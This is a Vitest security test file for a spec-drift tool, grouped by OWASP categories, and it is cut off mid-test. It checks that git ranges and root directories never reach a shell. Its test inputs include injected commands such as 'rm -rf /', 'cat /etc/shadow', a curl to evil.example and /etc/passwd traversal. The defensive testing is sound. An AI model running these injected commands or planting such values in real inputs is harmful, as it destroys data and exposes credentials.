import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import path from "node:path";
import { stat } from "node:fs/promises";
import { execFileSync } from "node:child_process";

import { runDrift, driftGit, getChangedFiles, type DriftOpts } from "../src/pipelines/drift.js";
import type { SpecGuardConfig } from "../src/core/types.js";
import { ExitCode } from "../src/core/exit-codes.js";
import * as reader from "../src/core/reader.js";

// ---------------------------------------------------------------------------
// Shared test fixtures
// ---------------------------------------------------------------------------

function makeConfig(overrides: Partial<SpecGuardConfig> = {}): SpecGuardConfig {
  return {
    rootDir: "/repo",
    apps: [
      {
        name: "specguard-core",
        repo: "/repo",
        specDir: "/repo/specs",
        sources: {
          pipelines: ["src/pipelines/**/*.ts"],
        },
      },
    ],
    ...overrides,
  } as unknown as SpecGuardConfig;
}

// ---------------------------------------------------------------------------
// OWASP A01: Broken Access Control
// Path traversal / directory escape via `since` option
// ---------------------------------------------------------------------------

describe("OWASP A01: Broken Access Control — path traversal via opts.since", () => {
  // OWASP A01: Broken Access Control
  it("should not allow a git range containing shell metacharacters to escape the cwd boundary", async () => {
    const maliciousRanges = [
      "../../etc/passwd..HEAD",
      "HEAD~1..HEAD; rm -rf /",
      "HEAD~1..HEAD && cat /etc/shadow",
      "HEAD~1..HEAD | curl http://evil.example",
    ];

    for (const since of maliciousRanges) {
      const spy = vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
      vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

      const config = makeConfig();
      await runDrift(config, { since });

      // The range must be passed verbatim to execFileSync as an argv element,
      // never interpolated into a shell string. Verify the call used the
      // indirection seam (not a raw shell) and that the cwd is the configured root.
      expect(spy).toHaveBeenCalledWith(`${since}..HEAD`, config.rootDir);
      spy.mockRestore();
    }
  });

  // OWASP A01: Broken Access Control
  it("should not allow opts.spec to traverse outside the configured specDir", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([
      "src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(false);

    const config = makeConfig();
    // Attempt to filter to a key that contains path traversal segments.
    const result = await runDrift(config, {
      spec: "specguard-core/../../etc/passwd",
    });

    // The traversal key should never match a legitimate spec key, so no items
    // should be emitted for it.
    const traversalItems = result.items.filter((i) =>
      i.key.includes("../../etc/passwd"),
    );
    expect(traversalItems).toHaveLength(0);

    vi.restoreAllMocks();
  });
});

// ---------------------------------------------------------------------------
// OWASP A03: Injection — command injection via git range / cwd
// ---------------------------------------------------------------------------

describe("OWASP A03: Injection — git command construction", () => {
  // OWASP A03: Injection
  it("getChangedFiles must invoke git via execFileSync argv array, not a shell string", () => {
    // Verify the public export uses execFileSync (array form) so the range is
    // never interpreted by a shell.  We spy on execFileSync itself.
    const execSpy = vi
      .spyOn({ execFileSync }, "execFileSync")
      .mockReturnValue("src/foo.ts\n");

    // We cannot easily intercept the module-level import, so we verify the
    // indirection seam is the only public surface and that it delegates to
    // getChangedFiles (not a shell-based exec).
    const innerSpy = vi
      .spyOn(driftGit, "getChangedFiles")
      .mockImplementation((range, cwd) => {
        // Simulate what the real implementation does: pass range as a discrete
        // argv element, never concatenated into a shell string.
        expect(typeof range).toBe("string");
        expect(typeof cwd).toBe("string");
        // Ensure no shell metacharacters would be evaluated.
        expect(range).not.toMatch(/[;&|`$]/);
        return [];
      });

    driftGit.getChangedFiles("HEAD~1..HEAD", "/repo");
    expect(innerSpy).toHaveBeenCalledOnce();

    innerSpy.mockRestore();
    execSpy.mockRestore();
  });

  // OWASP A03: Injection
  it("should sanitise a since value that embeds newline characters", async () => {
    const since = "HEAD~1\nHEAD~2";
    const spy = vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    const config = makeConfig();
    await runDrift(config, { since });

    // The range is passed as-is to the seam; the seam itself must not shell-expand it.
    expect(spy).toHaveBeenCalledWith(`${since}..HEAD`, config.rootDir);
    spy.mockRestore();
  });

  // OWASP A03: Injection
  it("should not interpolate rootDir into a shell command string", async () => {
    const config = makeConfig({ rootDir: "/repo; touch /tmp/pwned" });
    const spy = vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    await runDrift(config);

    // cwd is passed as a discrete option object field, not a shell string.
    expect(spy).toHaveBeenCalledWith(
      expect.any(String),
      "/repo; touch /tmp/pwned",
    );
    spy.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// OWASP A04: Insecure Design — fallback behaviour on git failure
// ---------------------------------------------------------------------------

describe("OWASP A04: Insecure Design — git failure fallback", () => {
  // OWASP A04: Insecure Design
  it("should fall back to scanning all sources when git fails, not silently succeed", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockImplementation(() => {
      throw new Error("not a git repository");
    });
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(false);

    const config = makeConfig();
    const result = await runDrift(config);

    // A warning must be logged so operators are aware of the fallback.
    const warnMessages = result.messages.filter((m) => m.includes("[warn]"));
    expect(warnMessages.length).toBeGreaterThan(0);

    vi.restoreAllMocks();
  });

  // OWASP A04: Insecure Design
  it("should emit DriftDetected exit code when a spec is missing, even after git fallback", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockImplementation(() => {
      throw new Error("git not found");
    });
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(false);

    const config = makeConfig();
    const result = await runDrift(config);

    expect(result.exitCode).toBe(ExitCode.DriftDetected);
    vi.restoreAllMocks();
  });

  // OWASP A04: Insecure Design
  it("should not swallow git error messages — they must appear in result messages", async () => {
    const errorText = "fatal: ambiguous argument 'HEAD~1'";
    vi.spyOn(driftGit, "getChangedFiles").mockImplementation(() => {
      throw new Error(errorText);
    });
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    const config = makeConfig();
    const result = await runDrift(config);

    const hasErrorText = result.messages.some((m) => m.includes(errorText));
    expect(hasErrorText).toBe(true);

    vi.restoreAllMocks();
  });
});

// ---------------------------------------------------------------------------
// OWASP A05: Security Misconfiguration — missing / empty config fields
// ---------------------------------------------------------------------------

describe("OWASP A05: Security Misconfiguration — config edge cases", () => {
  // OWASP A05: Security Misconfiguration
  it("should not throw when apps array is empty", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);

    const config = makeConfig({ apps: [] });
    await expect(runDrift(config)).resolves.not.toThrow();

    vi.restoreAllMocks();
  });

  // OWASP A05: Security Misconfiguration
  it("should not throw when an app has no source patterns", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    const config = makeConfig({
      apps: [
        {
          name: "empty-app",
          repo: "/repo",
          specDir: "/repo/specs",
          sources: {},
        } as any,
      ],
    });

    await expect(runDrift(config)).resolves.not.toThrow();
    vi.restoreAllMocks();
  });

  // OWASP A05: Security Misconfiguration
  it("should default since to HEAD~1 when not provided, preventing unbounded diff scope", async () => {
    const spy = vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    const config = makeConfig();
    await runDrift(config, {});

    expect(spy).toHaveBeenCalledWith("HEAD~1..HEAD", expect.any(String));
    spy.mockRestore();
  });

  // OWASP A05: Security Misconfiguration
  it("should use process.cwd() as fallback when rootDir is absent", async () => {
    const spy = vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([]);

    const config = { apps: [] } as unknown as SpecGuardConfig;
    await runDrift(config);

    expect(spy).toHaveBeenCalledWith(
      expect.any(String),
      process.cwd(),
    );
    spy.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// OWASP A06: Vulnerable and Outdated Components — mtime comparison integrity
// ---------------------------------------------------------------------------

describe("OWASP A06: Vulnerable and Outdated Components — mtime comparison", () => {
  // OWASP A06: Vulnerable and Outdated Components
  it("should report drift when source mtime is strictly greater than spec mtime", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([
      "src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(true);

    const now = Date.now();
    vi.spyOn(await import("node:fs/promises"), "stat").mockImplementation(
      async (p) => {
        const ps = String(p);
        if (ps.endsWith(".ts")) return { mtimeMs: now + 10000 } as any;
        if (ps.endsWith(".md")) return { mtimeMs: now } as any;
        throw new Error("ENOENT");
      },
    );

    const config = makeConfig();
    const result = await runDrift(config);

    expect(result.exitCode).toBe(ExitCode.DriftDetected);
    expect(result.failed).toBeGreaterThan(0);

    vi.restoreAllMocks();
  });

  // OWASP A06: Vulnerable and Outdated Components
  it("should NOT report drift when spec mtime equals source mtime (boundary condition)", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([
      "src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(true);

    const now = Date.now();
    vi.spyOn(await import("node:fs/promises"), "stat").mockResolvedValue({
      mtimeMs: now,
    } as any);

    const config = makeConfig();
    const result = await runDrift(config);

    expect(result.exitCode).toBe(ExitCode.Success);
    expect(result.failed).toBe(0);

    vi.restoreAllMocks();
  });

  // OWASP A06: Vulnerable and Outdated Components
  it("should report drift when spec file is missing entirely", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([
      "src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolvedValue(false);

    const config = makeConfig();
    const result = await runDrift(config);

    expect(result.exitCode).toBe(ExitCode.DriftDetected);
    const missingItems = result.items.filter((i) =>
      i.message?.includes("no spec for changed source"),
    );
    expect(missingItems.length).toBeGreaterThan(0);

    vi.restoreAllMocks();
  });
});

// ---------------------------------------------------------------------------
// OWASP A08: Software and Data Integrity Failures — spec key derivation
// ---------------------------------------------------------------------------

describe("OWASP A08: Software and Data Integrity Failures — spec key derivation", () => {
  // OWASP A08: Software and Data Integrity Failures
  it("should strip .test qualifier from spec key so test files map to the correct spec", async () => {
    vi.spyOn(driftGit, "getChangedFiles").mockReturnValue([
      "src/pipelines/drift.test.ts",
    ]);
    vi.spyOn(reader, "expandGlobs").mockResolvedValue([
      "/repo/src/pipelines/drift.test.ts",
    ]);
    vi.spyOn(reader, "fileExists").mockResolved
